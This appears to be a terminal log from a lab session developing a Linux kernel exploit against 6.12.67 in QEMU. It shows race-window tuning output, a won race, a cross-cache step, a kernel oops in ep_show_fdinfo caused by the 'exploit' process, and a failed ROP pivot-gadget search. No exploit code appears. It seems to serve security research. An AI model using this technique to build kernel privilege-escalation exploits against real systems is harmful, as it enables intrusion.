+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=37)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=37)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=37)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [3250,4000] (interrupts=37)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [3250,4000] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [3000,3750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=36)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=36)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [3000,3750] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [3250,4000] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [1750,2500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2000,2750] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [3250,4000] (interrupts=27)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [3250,4000] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [3250,4000] (interrupts=37)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=36)
+[+] racer: stat done (10 iters) -> locked best range [3000,3750] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [3000,3750] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=36)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [2250,3000] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [3250,4000] (interrupts=33)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=40)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [2750,3500] (interrupts=38)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=39)
+[+] racer: stat done (10 iters) -> locked best range [2500,3250] (interrupts=39)
+[+] race won: retries=444356 launch=2786 cc_retries=1
+[*] cross-cache...
+[  231.310961] BUG: unable to handle page fault for address: ffffffff8440d830
+[  231.311445] #PF: supervisor read access in kernel mode
+[  231.311741] #PF: error_code(0x0000) - not-present page
+[  231.312051] PGD 2c31067 P4D 2c31067 PUD 2c32063 PMD 0 
+[  231.312519] Oops: Oops: 0000 [#1] PREEMPT SMP PTI
+[  231.312901] CPU: 1 UID: 0 PID: 67 Comm: exploit Not tainted 6.12.67 #1
+[  231.313475] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.17.0-10.fc44 06/10/2025
+[  231.314221] RIP: 0010:ep_show_fdinfo+0x4c/0x80
+[  231.314618] Code: 4c 48 89 df e8 f5 f3 cf 00 48 89 c3 48 85 c0 74 3c 48 8b 53 30 4c 8b 43 6c 48 89 ef 8b 4b 68 48 8b 42 28 4c 8b 4a 70 8b 53 38 <48> 8b 70 28 8b 76 10 56 48 c7 c6 18 a7 99 82 ff 70 40 e8 7d 27 fd
+[  231.316257] RSP: 0018:ffffc90000253d30 EFLAGS: 00010282
+[  231.316687] RAX: ffffffff8440d808 RBX: ffff888005f57e80 RCX: 0000000000000019
+[  231.317365] RDX: 0000000000000107 RSI: ffff8880059379c0 RDI: ffff888005a95000
+[  231.317781] RBP: ffff888005a95000 R08: 0000000000000000 R09: 0000000000000000
+[  231.318438] R10: ffff888005a95000 R11: 0000000000000000 R12: ffff888005c03a80
+[  231.319143] R13: 0000000000000000 R14: 0000000000000002 R15: ffff8880059379c0
+[  231.319842] FS:  0000000029e28400(0000) GS:ffff88807cb00000(0000) knlGS:0000000000000000
+[  231.320643] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  231.321208] CR2: ffffffff8440d830 CR3: 0000000003f54001 CR4: 0000000000370ef0
+[  231.321862] Call Trace:
+[  231.322120]  <TASK>
+[  231.322366]  seq_show+0x14c/0x240
+[  231.322665]  seq_read_iter+0x111/0x460
+[  231.323033]  seq_read+0x128/0x1c0
+[  231.323399]  vfs_read+0x114/0x490
+[  231.323731]  ? vfs_write+0x43e/0x570
+[  231.324091]  __x64_sys_pread64+0x92/0xd0
+[  231.324503]  do_syscall_64+0x9e/0x1a0
+[  231.324864]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
+[  231.325388] RIP: 0033:0x557992
+[  231.325697] Code: 08 0f 85 f1 a7 ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 00 f3 0f 1e fa 55 bf 01 00
+[  231.327517] RSP: 002b:00007ffc0ee8dfd8 EFLAGS: 00000246 ORIG_RAX: 0000000000000011
+[  231.328304] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000557992
+[  231.328990] RDX: 0000000000000400 RSI: 00007ffc0ee8e050 RDI: 000000000000000b
+[  231.329597] RBP: 00007ffc0ee8e000 R08: 0000000000000000 R09: 0000000000000000
+[  231.330020] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000029e3e448
+[  231.330490] R13: 0000000029e3e448 R14: 0000000029e3e450 R15: 0000000029e3e3f0
+[  231.331193]  </TASK>
+[  231.331424] Modules linked in:
+[  231.331729] CR2: ffffffff8440d830
+[  231.332055] ---[ end trace 0000000000000000 ]---
+[  231.332534] RIP: 0010:ep_show_fdinfo+0x4c/0x80
+[  231.332940] Code: 4c 48 89 df e8 f5 f3 cf 00 48 89 c3 48 85 c0 74 3c 48 8b 53 30 4c 8b 43 6c 48 89 ef 8b 4b 68 48 8b 42 28 4c 8b 4a 70 8b 53 38 <48> 8b 70 28 8b 76 10 56 48 c7 c6 18 a7 99 82 ff 70 40 e8 7d 27 fd
+[  231.334664] RSP: 0018:ffffc90000253d30 EFLAGS: 00010282
+[  231.335171] RAX: ffffffff8440d808 RBX: ffff888005f57e80 RCX: 0000000000000019
+[  231.335875] RDX: 0000000000000107 RSI: ffff8880059379c0 RDI: ffff888005a95000
+[  231.336605] RBP: ffff888005a95000 R08: 0000000000000000 R09: 0000000000000000
+[  231.337307] R10: ffff888005a95000 R11: 0000000000000000 R12: ffff888005c03a80
+[  231.337972] R13: 0000000000000000 R14: 0000000000000002 R15: ffff8880059379c0
+[  231.338681] FS:  0000000029e28400(0000) GS:ffff88807cb00000(0000) knlGS:0000000000000000
+[  231.339483] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  231.340038] CR2: ffffffff8440d830 CR3: 0000000003f54001 CR4: 0000000000370ef0
+[  231.340592] note: exploit[67] exited with irqs disabled
+[  231.340972] exploit (67) used greatest stack depth: 13192 bytes left
+  
+
+^C^CQEMU: Terminated
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ 
+
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ python3 /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/find_gadgets.py \
+  /mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm/linux-6.12.67/vmlinux
+
+--- PIVOT1 ---
+  Exact pattern not found.
+
+--- PIVOT2 ---
+  Exact pattern not found.
+
+--- PIVOT3 ---
+  Exact pattern not found.
+
+--- PIVOT4 ---
+  Exact pattern not found.
+legion@fedora:/mnt/work/company/cyphermatrix/repos/bad-epoll-lab/exploit/tier1-linux-vm$ 
